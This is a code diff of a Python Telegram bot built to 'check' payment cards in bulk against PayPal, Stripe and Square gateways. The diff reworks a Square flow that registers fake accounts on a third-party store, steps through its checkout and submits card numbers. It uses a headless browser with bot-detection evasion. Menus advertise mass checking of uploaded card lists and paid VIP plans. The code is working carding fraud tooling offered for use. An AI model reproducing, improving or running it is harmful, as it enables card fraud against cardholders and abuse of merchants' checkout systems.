@@ -9,7 +9,6 @@ import asyncio
 import httpx
 import requests
 import json
-import subprocess
 import tempfile
 import threading
 from urllib.parse import urlparse
@@ -59,7 +58,8 @@ PREMIUM_EMOJI_IDS = {
     "🎁": "6026316531967726726", "⏸": "6026056450223116307", "💸": "5231449120635370684",
     "🛍": "5229064374403998351", "🔜": "5440621591387980068", "⏹": "5359543311897998264",
     "ADMIN": "6125216237086579378", "GATE": "5929335569128623821", "BOT": "6039619012051082706",
-    "VIP": "6039601162167000043", "TOOLS": "6026056450223116307"
+    "VIP": "6039601162167000043", "TOOLS": "6026056450223116307",
+    "PAYPAL": "5445353829304387411", "STRIPE": "5206607081334906820", "SQUARE": "5231200819986047254"
 }
 
 def premium_emoji(text):
@@ -110,7 +110,7 @@ def banned_guard(message):
         return True
     return False
 
-# ==================== Square Config ====================
+# ==================== Square Config (Requests instead of curl) ====================
 SQUARE_SITE = "https://cosmos-industrial.com"
 SQUARE_PRODUCT_ID = 110
 SQUARE_PRICE = "5.00"
@@ -118,117 +118,85 @@ SQUARE_UA = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 )
-SQUARE_CURL_HEADERS = [
-    "-A", SQUARE_UA, "--compressed",
-    "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    "-H", "Accept-Language: en-US,en;q=0.9",
-    "-H", "Sec-Fetch-Site: same-origin",
-    "-H", "Sec-Fetch-Mode: navigate",
-    "-H", "Upgrade-Insecure-Requests: 1",
-]
 
-def square_curl(jar, url, *extra):
-    cmd = ["curl", "-sS", "-m", "25", "-c", jar, "-b", jar, "-L"] + SQUARE_CURL_HEADERS + list(extra) + [url]
-    return subprocess.run(cmd, capture_output=True, text=True).stdout
+def square_requests_flow(zip_code):
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": SQUARE_UA,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+    })
+    
+    r = session.get(SQUARE_SITE + "/")
+    if "cookie_test" not in session.cookies:
+        session.cookies.set("cookie_test", "please_accept_for_session", domain=".cosmos-industrial.com")
 
-def square_parse_jar(jar_path):
-    cookies = []
-    with open(jar_path) as fh:
-        for line in fh:
-            raw = line.rstrip()
-            if not raw:
-                continue
-            if raw.startswith("#HttpOnly_"):
-                raw = raw[len("#HttpOnly_"):]
-            elif raw.startswith("#"):
-                continue
-            parts = raw.split("\t")
-            if len(parts) < 7:
-                continue
-            cookies.append({
-                "name": parts[5],
-                "value": parts[6],
-                "domain": ".cosmos-industrial.com",
-                "path": parts[2],
-                "secure": parts[3].upper() == "TRUE",
-                "httpOnly": True,
-                "sameSite": "Lax",
-            })
-    return cookies
+    r = session.get(SQUARE_SITE + "/index.php?main_page=create_account")
+    m = re.search(r'name="securityToken" value="([^"]+)"', r.text)
+    if not m:
+        return {"error": "reg_token_missing"}
 
-def square_curl_flow(zip_code):
-    jar = tempfile.mktemp()
     ts = int(time.time() * 1000)
     email = f"c{ts}@example.com"
     password = "TestPass123!"
+    
+    data = {
+        "securityToken": m.group(1),
+        "action": "process",
+        "email_pref_html": "email_format",
+        "firstname": "Test",
+        "lastname": "User",
+        "street_address": "123 Main St",
+        "suburb": "",
+        "city": "Austin",
+        "zone_country_id": "223",
+        "country": "223",
+        "zone_id": "57",
+        "state": "Texas",
+        "postcode": zip_code,
+        "telephone": "5125551234",
+        "email_address": email,
+        "password": password,
+        "confirmation": password,
+        "newsletter": "",
+        "email_format": "HTML"
+    }
+    session.post(SQUARE_SITE + "/index.php?main_page=create_account&action=process", data=data)
 
-    square_curl(jar, SQUARE_SITE + "/")
-    lines = open(jar).read().splitlines()
-    if not any("cookie_test" in line for line in lines):
-        lines.append(".cosmos-industrial.com\tTRUE\t/\tTRUE\t0\tcookie_test\tplease_accept_for_session")
-        open(jar, "w").write("\n".join(lines) + "\n")
+    session.get(SQUARE_SITE + f"/index.php?main_page=product_info&products_id={SQUARE_PRODUCT_ID}&action=buy_now")
 
-    page = square_curl(jar, SQUARE_SITE + "/index.php?main_page=create_account")
-    m = re.search(r'name="securityToken" value="([^"]+)"', page)
+    r = session.get(SQUARE_SITE + "/index.php?main_page=checkout_shipping")
+    m = re.search(r'name="securityToken" value="([^"]+)"', r.text)
     if not m:
-        return jar, {"error": "reg_token_missing"}
+        return {"error": "ship_token_missing"}
 
-    square_curl(
-        jar,
-        SQUARE_SITE + "/index.php?main_page=create_account&action=process",
-        "-H", f"Referer: {SQUARE_SITE}/index.php?main_page=create_account",
-        "--data-urlencode", f"securityToken={m.group(1)}",
-        "--data-urlencode", "action=process",
-        "--data-urlencode", "email_pref_html=email_format",
-        "--data-urlencode", "firstname=Test",
-        "--data-urlencode", "lastname=User",
-        "--data-urlencode", "street_address=123 Main St",
-        "--data-urlencode", "suburb=",
-        "--data-urlencode", "city=Austin",
-        "--data-urlencode", "zone_country_id=223",
-        "--data-urlencode", "country=223",
-        "--data-urlencode", "zone_id=57",
-        "--data-urlencode", "state=Texas",
-        "--data-urlencode", f"postcode={zip_code}",
-        "--data-urlencode", "telephone=5125551234",
-        "--data-urlencode", f"email_address={email}",
-        "--data-urlencode", f"password={password}",
-        "--data-urlencode", f"confirmation={password}",
-        "--data-urlencode", "newsletter=",
-        "--data-urlencode", "email_format=HTML",
-    )
+    data = {
+        "securityToken": m.group(1),
+        "action": "process",
+        "shipping": "zones_zones"
+    }
+    session.post(SQUARE_SITE + "/index.php?main_page=checkout_shipping&action=process", data=data)
 
-    square_curl(jar, SQUARE_SITE + f"/index.php?main_page=product_info&products_id={SQUARE_PRODUCT_ID}&action=buy_now")
+    r = session.get(SQUARE_SITE + "/index.php?main_page=checkout_payment")
+    if "Step 2 of 3" not in r.text:
+        return {"error": "payment_page_not_reached"}
 
-    page = square_curl(jar, SQUARE_SITE + "/index.php?main_page=checkout_shipping")
-    m = re.search(r'name="securityToken" value="([^"]+)"', page)
-    if not m:
-        return jar, {"error": "ship_token_missing"}
+    return {"ok": True, "session": session}
 
-    square_curl(
-        jar,
-        SQUARE_SITE + "/index.php?main_page=checkout_shipping&action=process",
-        "-H", f"Referer: {SQUARE_SITE}/index.php?main_page=checkout_shipping",
-        "--data-urlencode", f"securityToken={m.group(1)}",
-        "--data-urlencode", "action=process",
-        "--data-urlencode", "shipping=zones_zones",
-    )
-
-    page = square_curl(jar, SQUARE_SITE + "/index.php?main_page=checkout_payment")
-    if "Step 2 of 3" not in page:
-        return jar, {"error": "payment_page_not_reached"}
-
-    return jar, {"ok": True}
-
-async def square_pw_submit(browser, jar_path, cc, exp, cvv):
-    cookies = square_parse_jar(jar_path)
+async def square_pw_submit(browser, session, cc, exp, cvv):
     ctx = await browser.new_context(
         user_agent=SQUARE_UA,
         viewport={"width": 1366, "height": 900},
         locale="en-US",
     )
     await ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
-    await ctx.add_cookies(cookies)
+    for cookie in session.cookies:
+        await ctx.add_cookies([{
+            "name": cookie.name,
+            "value": cookie.value,
+            "domain": ".cosmos-industrial.com",
+            "path": "/"
+        }])
     page = await ctx.new_page()
 
     try:
@@ -296,17 +264,16 @@ async def square_pw_submit(browser, jar_path, cc, exp, cvv):
         await ctx.close()
 
 async def square_run_check_async(cc, mm, yy, cvv, zip_code):
-    jar, state = square_curl_flow(zip_code)
+    state = square_requests_flow(zip_code)
 
     if not state.get("ok"):
-        if os.path.exists(jar):
-            os.unlink(jar)
         return {
             "approved": False,
             "message": state.get("error", "flow_failed"),
             "status": "Declined",
         }
 
+    session = state["session"]
     exp = f"{int(mm):02d}{yy[-2:]}"
 
     try:
@@ -316,12 +283,11 @@ async def square_run_check_async(cc, mm, yy, cvv, zip_code):
                 args=["--no-sandbox", "--disable-blink-features=AutomationControlled"],
             )
             try:
-                raw = await square_pw_submit(browser, jar, cc, exp, cvv)
+                raw = await square_pw_submit(browser, session, cc, exp, cvv)
             finally:
                 await browser.close()
     finally:
-        if os.path.exists(jar):
-            os.unlink(jar)
+        pass
 
     return raw
 
@@ -391,7 +357,7 @@ async def get_bin_info(bin_number):
         await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
 
-# ==================== PayPal ====================
+# ==================== PayPal (with token decryption & required fields) ====================
 UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
 api_semaphore = asyncio.Semaphore(6)
 
@@ -647,9 +613,12 @@ class PayPalCommerce:
         data['give_first'] = first_name
         data['give_last'] = last_name
         data['give_email'] = self.email
+        
+        title = random.choice(["Mr", "Mrs", "Ms", "Dr"])
+        data['give_title'] = title
+        
         inputs = re.findall(r'<(?:input|select|textarea)[^>]*name=["\']([^"\']+)["\'][^>]*>', form_html, re.IGNORECASE)
         optional_fields = {
-            'give_title': 'Mr',
             'give_company': '',
             'give_comment': '',
             'give_anonymous': '0',
@@ -1373,77 +1342,94 @@ def start(message):
     keyboard = {
         "inline_keyboard": [
             [
-                {"text": "Gateways Auth", "callback_data": "free_cmds", "style": "success", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["BOT"]},
+                {"text": "Gateways Auth", "callback_data": "auth_panel", "style": "success", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["BOT"]},
                 {"text": "Gateways Charge", "callback_data": "check_panel", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["GATE"]}
             ],
             [
                 {"text": "Plans", "callback_data": "vip_cmds", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["VIP"]},
-                {"text": "Tools", "callback_data": "stats_panel", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["TOOLS"]}
+                {"text": "Tools", "callback_data": "tools_panel", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["TOOLS"]}
             ],
             [
-                {"text": "My Account", "callback_data": "admin_cmds", "style": "danger", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["ADMIN"]}
+                {"text": "My Account", "callback_data": "my_account", "style": "danger", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["ADMIN"]}
             ]
         ]
     }
     
     bot.send_message(message.chat.id, text, reply_markup=json.dumps(keyboard))
 
-@bot.callback_query_handler(func=lambda call: call.data in ["free_cmds", "vip_cmds", "admin_cmds", "check_panel", "stats_panel"])
+@bot.callback_query_handler(func=lambda call: call.data in ["auth_panel", "tools_panel", "my_account", "back_start"])
 def callback_panels(call):
     if banned_guard(call.message): return
     bot.answer_callback_query(call.id)
     
     back_btn = [{"text": "Back", "callback_data": "back_start", "style": "danger"}]
     
-    if call.data == "free_cmds":
-        text = premium_emoji("🤖 FREE COMMANDS:\n• /start - Start\n• /cmds - Commands\n• /pp [card] - PayPal single\n• /sq [card] - Square 5$ single\n• /stop - Stop mass\n• /code [key] - Activate VIP")
+    if call.data == "auth_panel":
+        text = premium_emoji("🔐 No auth gateways available at the moment. They will be added soon.")
         keyboard = {"inline_keyboard": [back_btn]}
-    elif call.data == "vip_cmds":
-        text = premium_emoji("💎 VIP COMMANDS:\n• Upload combo file - Mass checking (Max 2000)\n• /st [card] - Stripe single\n• /pp [card] - PayPal single\n• /sq [card] - Square 5$ single")
+    elif call.data == "tools_panel":
+        text = premium_emoji("🔧 TOOLS:\n• /clean - Clean cards file\n• /split - Split file")
         keyboard = {"inline_keyboard": [back_btn]}
-    elif call.data == "admin_cmds":
-        if call.from_user.id not in ADMINS:
-            bot.answer_callback_query(call.id, "Admin only!", show_alert=True)
-            return
-        text = premium_emoji("👑 ADMIN COMMANDS:\n• /add [url] - Add gateway\n• /rmadd [num] - Remove gateway\n• /show_gateways - Show gateways\n• /ban_user [id] - Ban user\n• /unban_user [id] - Unban user\n• /banned_list - Show banned users\n• /prm [id] [days] - Add VIP\n• /rmprm [id] - Remove VIP\n• /addkey [pk] [sk] - Add Stripe key\n• /rmkey [id] - Remove Stripe key\n• /wafa [days] [max] - Generate codes\n• /SENT [msg] - Broadcast")
+    elif call.data == "my_account":
+        username = call.from_user.username or "No Username"
+        user_status = "Admin 👑" if call.from_user.id in ADMINS else ("VIP 💎" if call.from_user.id in VIP_USERS and VIP_USERS[call.from_user.id] > time.time() else "Free User 🤖")
+        text = premium_emoji(f"👤 MY ACCOUNT:\n🆔 ID: <code>{call.from_user.id}</code>\n👤 Username: @{username}\n💎 Status: {user_status}")
         keyboard = {"inline_keyboard": [back_btn]}
-    elif call.data == "check_panel":
-        text = premium_emoji("💳 Choose check type:")
+    elif call.data == "back_start":
+        username = call.from_user.username or "No Username"
+        text = premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online")
         keyboard = {
             "inline_keyboard": [
-                [{"text": "PayPal", "callback_data": "check_paypal", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["GATE"]}],
-                [{"text": "Stripe", "callback_data": "check_stripe", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["GATE"]}],
-                [{"text": "Square 5$", "callback_data": "check_square", "style": "success", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["GATE"]}],
-                back_btn
+                [
+                    {"text": "Gateways Auth", "callback_data": "auth_panel", "style": "success", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["BOT"]},
+                    {"text": "Gateways Charge", "callback_data": "check_panel", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["GATE"]}
+                ],
+                [
+                    {"text": "Plans", "callback_data": "vip_cmds", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["VIP"]},
+                    {"text": "Tools", "callback_data": "tools_panel", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["TOOLS"]}
+                ],
+                [
+                    {"text": "My Account", "callback_data": "my_account", "style": "danger", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["ADMIN"]}
+                ]
             ]
         }
-    elif call.data == "stats_panel":
-        text = premium_emoji(f"📊 STATS:\n👥 Users: {len(ALL_USERS)}\n🌐 Gateways: {len(GATEWAYS)}\n🔑 Stripe Keys: {len(STRIPE_KEYS)}")
-        keyboard = {"inline_keyboard": [back_btn]}
         
     bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=json.dumps(keyboard))
 
-@bot.callback_query_handler(func=lambda call: call.data == "back_start")
-def back_start(call):
+@bot.callback_query_handler(func=lambda call: call.data == "check_panel")
+def check_panel(call):
     if banned_guard(call.message): return
     bot.answer_callback_query(call.id)
-    username = call.from_user.username or "No Username"
-    text = premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online")
+    text = premium_emoji("💳 Choose check type:")
     keyboard = {
         "inline_keyboard": [
-            [
-                {"text": "Gateways Auth", "callback_data": "free_cmds", "style": "success", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["BOT"]},
-                {"text": "Gateways Charge", "callback_data": "check_panel", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["GATE"]}
-            ],
-            [
-                {"text": "Plans", "callback_data": "vip_cmds", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["VIP"]},
-                {"text": "Tools", "callback_data": "stats_panel", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["TOOLS"]}
-            ],
-            [
-                {"text": "My Account", "callback_data": "admin_cmds", "style": "danger", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["ADMIN"]}
-            ]
+            [{"text": "PayPal", "callback_data": "check_paypal", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["PAYPAL"]}],
+            [{"text": "Stripe", "callback_data": "check_stripe", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["STRIPE"]}],
+            [{"text": "Square 5$", "callback_data": "check_square", "style": "success", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["SQUARE"]}],
+            [{"text": "Back", "callback_data": "back_start", "style": "danger"}]
         ]
     }
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=json.dumps(keyboard))
+
+@bot.callback_query_handler(func=lambda call: call.data in ["check_paypal", "check_stripe", "check_square"])
+def check_commands_info(call):
+    if banned_guard(call.message): return
+    bot.answer_callback_query(call.id)
+    gateway = call.data.split("_")[1]
+    if gateway == "paypal":
+        text = premium_emoji("💳 Send card:\n<code>/pp [card]</code>")
+    elif gateway == "stripe":
+        text = premium_emoji("💳 Send card:\n<code>/st [card]</code>")
+    else:
+        text = premium_emoji("💳 Send card:\n<code>/sq [card]</code>\n\n⚠️ Square charges 5$ per card.")
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id)
+
+@bot.callback_query_handler(func=lambda call: call.data == "vip_cmds")
+def vip_cmds(call):
+    if banned_guard(call.message): return
+    bot.answer_callback_query(call.id)
+    text = premium_emoji("💎 VIP COMMANDS:\n• Upload combo file - Mass checking (Max 2000)\n• /st [card] - Stripe single\n• /pp [card] - PayPal single\n• /sq [card] - Square 5$ single")
+    keyboard = {"inline_keyboard": [[{"text": "Back", "callback_data": "back_start", "style": "danger"}]]}
     bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=json.dumps(keyboard))
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_mass_"))
@@ -1610,9 +1596,9 @@ def handle_file_panel(message):
         
         keyboard = {
             "inline_keyboard": [
-                [{"text": "PayPal Check", "callback_data": "gateway_paypal", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["GATE"]}],
-                [{"text": "Stripe Check", "callback_data": "gateway_stripe", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["GATE"]}],
-                [{"text": "Square 5$", "callback_data": "gateway_square", "style": "success", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["GATE"]}]
+                [{"text": "PayPal Check", "callback_data": "gateway_paypal", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["PAYPAL"]}],
+                [{"text": "Stripe Check", "callback_data": "gateway_stripe", "style": "primary", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["STRIPE"]}],
+                [{"text": "Square 5$", "callback_data": "gateway_square", "style": "success", "icon_custom_emoji_id": PREMIUM_EMOJI_IDS["SQUARE"]}]
             ]
         }
         bot.reply_to(message, premium_emoji(f"📁 File Received!\n💳 Cards: {card_count}\n\nChoose gateway:"), reply_markup=json.dumps(keyboard))
@@ -1724,15 +1710,15 @@ def clean_command(message):
     except Exception as e:
         bot.edit_message_text(premium_emoji(f"❌ Error: {e}"), message.chat.id, msg.message_id)
 
-@bot.message_handler(commands=['parts'])
-def parts_command(message):
+@bot.message_handler(commands=['split'])
+def split_command(message):
     if banned_guard(message): return
     if not message.reply_to_message or not message.reply_to_message.document:
-        bot.reply_to(message, premium_emoji("💡 Reply to a file with /parts [number]"))
+        bot.reply_to(message, premium_emoji("💡 Reply to a file with /split [number]"))
         return
     args = message.text.split()[1:]
     if not args:
-        bot.reply_to(message, premium_emoji("💡 Usage: <code>/parts [number]</code>"))
+        bot.reply_to(message, premium_emoji("💡 Usage: <code>/split [number]</code>"))
         return
     try:
         num_parts = int(args[0])
@@ -1748,7 +1734,7 @@ def parts_command(message):
         os.makedirs("downloads", exist_ok=True)
         file_info = bot.get_file(message.reply_to_message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
-        file_path = f"downloads/parts_{message.from_user.id}_{int(time.time())}.txt"
+        file_path = f"downloads/split_{message.from_user.id}_{int(time.time())}.txt"
         with open(file_path, 'wb') as new_file:
             new_file.write(downloaded_file)
             
